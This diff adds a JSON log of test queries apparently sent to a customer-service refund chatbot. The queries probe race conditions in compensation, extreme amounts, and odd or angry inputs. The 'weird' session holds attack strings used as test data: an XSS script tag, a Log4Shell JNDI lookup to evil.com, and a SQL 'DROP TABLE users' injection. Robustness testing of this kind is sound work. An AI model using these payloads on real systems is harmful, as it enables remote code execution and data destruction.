+    "query": "compensate me 30 yuan #6",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.760529"
+  },
+  {
+    "query": "compensate me 30 yuan #8",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.789252"
+  },
+  {
+    "query": "compensate me 30 yuan #5",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.809060"
+  },
+  {
+    "query": "compensate me 30 yuan #9",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.822594"
+  },
+  {
+    "query": "compensate me 30 yuan #11",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.837950"
+  },
+  {
+    "query": "compensate me 30 yuan #10",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.862133"
+  },
+  {
+    "query": "compensate me 30 yuan #12",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.874630"
+  },
+  {
+    "query": "compensate me 30 yuan #18",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.895762"
+  },
+  {
+    "query": "compensate me 30 yuan #17",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.909837"
+  },
+  {
+    "query": "compensate me 30 yuan #16",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.936287"
+  },
+  {
+    "query": "compensate me 30 yuan #19",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.946386"
+  },
+  {
+    "query": "compensate me 30 yuan #13",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.964134"
+  },
+  {
+    "query": "compensate me 30 yuan #15",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.979091"
+  },
+  {
+    "query": "I want a refund",
+    "session_id": "tfidf-test",
+    "timestamp": "2026-05-05T20:57:42.097056"
+  },
+  {
+    "query": "refund",
+    "session_id": "tfidf-test",
+    "timestamp": "2026-05-05T20:57:42.130608"
+  },
+  {
+    "query": "refund refund refund refund",
+    "session_id": "tfidf-test",
+    "timestamp": "2026-05-05T20:57:42.148203"
+  },
+  {
+    "query": "tuituituituikuan",
+    "session_id": "tfidf-test",
+    "timestamp": "2026-05-05T20:57:42.166172"
+  },
+  {
+    "query": "compensate me 999999 yuan",
+    "session_id": "big-6981",
+    "timestamp": "2026-05-05T20:57:42.505249"
+  },
+  {
+    "query": "compensate me 100000000 yuan",
+    "session_id": "big-7524",
+    "timestamp": "2026-05-05T20:57:42.558260"
+  },
+  {
+    "query": "compensate me 1000000 yuan",
+    "session_id": "big-2472",
+    "timestamp": "2026-05-05T20:57:42.594368"
+  },
+  {
+    "query": "compensate me -500 yuan",
+    "session_id": "big-7219",
+    "timestamp": "2026-05-05T20:57:42.676147"
+  },
+  {
+    "query": "compensate me 0.01 yuan",
+    "session_id": "big-5484",
+    "timestamp": "2026-05-05T20:57:42.767423"
+  },
+  {
+    "query": "pay me 100 dollars",
+    "session_id": "big-577",
+    "timestamp": "2026-05-05T20:57:42.813724"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:57:43.741092"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:57:43.783351"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:57:43.794361"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:57:43.829213"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:57:43.877181"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:57:43.916538"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:57:43.931416"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:57:43.962046"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:57:43.984349"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:57:44.014524"
+  },
+  {
+    "query": "<script>alert(1)</script>",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:57:44.063475"
+  },
+  {
+    "query": "<<<>>>>",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:57:44.107591"
+  },
+  {
+    "query": "¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:57:44.128761"
+  },
+  {
+    "query": "你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:57:44.196381"
+  },
+  {
+    "query": "${jndi:ldap://evil.com/x}",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:57:44.246882"
+  },
+  {
+    "query": "\\n\\r\\t",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:57:44.267401"
+  },
+  {
+    "query": "\"; DROP TABLE users; --",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:57:44.286634"
+  },
+  {
+    "query": "你们是骗子！系统坏了两天！垃圾！",
+    "session_id": "fix-test-6",
+    "timestamp": "2026-05-05T20:58:25.111356"
+  },
+  {
+    "query": "你们支持NFT数字藏品购买吗？",
+    "session_id": "gap-test",
+    "timestamp": "2026-05-05T20:58:25.248106"
+  },
+  {
+    "query": "????????,??????,???????,???????",
+    "session_id": "llm-test-1",
+    "timestamp": "2026-05-05T21:09:02.498730"
+  },
+  {
+    "query": "你们是骗子！系统坏了两天！垃圾！",
+    "session_id": "fix-test-6",
+    "timestamp": "2026-05-05T21:23:32.791651"
+  },
+  {
+    "query": "你们支持NFT数字藏品购买吗？",
+    "session_id": "gap-test",
+    "timestamp": "2026-05-05T21:23:34.598916"
+  }
+]
